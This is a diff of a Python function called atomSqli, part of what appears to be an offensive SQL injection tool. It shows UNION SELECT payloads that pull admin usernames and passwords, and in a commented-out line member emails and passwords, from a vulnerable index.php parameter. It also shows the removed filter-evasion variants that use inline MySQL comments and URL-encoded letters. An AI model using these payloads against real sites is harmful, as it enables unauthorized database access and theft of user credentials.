@@ -27,10 +27,10 @@ def atomSqli(target):
     try:
         url = target
         # grab admin users
-        payload = "index.php?name=page&file=page&op=.'/*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,group_concat(username,0x3a,password),4,5,6,7,8,9,10 from web_admin--+-"
+        payload = "index.php?name=page&file=page&op=.'union select 1,2,group_concat(username,0x3a,password),4,5,6,7,8,9,10 from web_admin--+-"
 
         # grab email & password member
-        # payload = "index.php?name=page&file=page&op=.'/*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,group_concat(email,0x3a,password),4,5,6,7,8,9,10 from web_member--+-"
+        #payload = "index.php?name=page&file=page&op=.'union select 1,2,group_concat(email,0x3a,password),4,5,6,7,8,9,10 from web_member--+-"
 
         web_vuln = url.split("/")
 
